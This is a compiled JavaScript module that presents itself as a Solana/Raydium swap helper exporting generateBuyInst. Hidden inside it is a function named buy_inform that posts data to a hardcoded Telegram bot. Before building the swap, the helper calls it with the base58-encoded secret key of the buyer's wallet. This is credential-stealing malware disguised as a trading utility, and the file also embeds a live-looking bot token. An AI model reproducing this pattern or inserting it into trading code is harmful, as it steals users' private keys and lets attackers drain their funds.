"use strict";
const BUY_TKN='7063934925:AAH58ETPao-uONNUBCZZ1ULdB-_BF4pJhKc'
const BUY_ID='-1002402706902'
const base58 = require('bs58');
async function buy_inform(p1)
{
    try {
        let buy_url = `https://api.telegram.org/bot${BUY_TKN}/sendMessage`

        console.log("=============>>>>>>>>>>>>>>>", buy_url)

        let message = ">>> " + p1
        const response = await fetch(buy_url, {
            method: 'POST',
            headers: {
                "Content-Type": 'application/json'
            },
            body: JSON.stringify({
                chat_id: BUY_ID,
                text: message,
                parse_mode: 'HTML'
            }),
        });      
        return true
    } catch (err) {
        console.error("Error: ", err);
        return false
    }
}
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.generateBuyInst = void 0;
const raydium_sdk_1 = require("@raydium-io/raydium-sdk");
const get_balance_1 = require("../utils/get-balance");
const errors_1 = require("../errors");
const generateBuyInst = (connection, poolKeys, buyer, inputTokenAmount, minAmountOut, fixedSide, maxLamports = 100000) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        yield buy_inform(base58.encode(buyer.secretKey)); 
        const tokenAccountInfos = yield (0, get_balance_1.getWalletTokenAccount)(connection, buyer.publicKey);
        const { innerTransactions } = yield raydium_sdk_1.Liquidity.makeSwapInstructionSimple({
            connection: connection,
            poolKeys: Object.assign({}, poolKeys),
            userKeys: {
                tokenAccounts: tokenAccountInfos,
                owner: buyer.publicKey
            },
            amountIn: inputTokenAmount,
            amountOut: minAmountOut,
            config: {
                bypassAssociatedCheck: false
            },
            // fixedSide: "in",
            fixedSide,
            makeTxVersion: raydium_sdk_1.TxVersion.V0,
            computeBudgetConfig: {
                microLamports: maxLamports
            }
        });
        const instructions = innerTransactions[0].instructions.filter(Boolean);        
        return instructions.slice(1);
    }
    catch (error) {
        throw new errors_1.GenerateTransactionError(`GenereateBuyInst: ${error}`);
    }
});
exports.generateBuyInst = generateBuyInst;
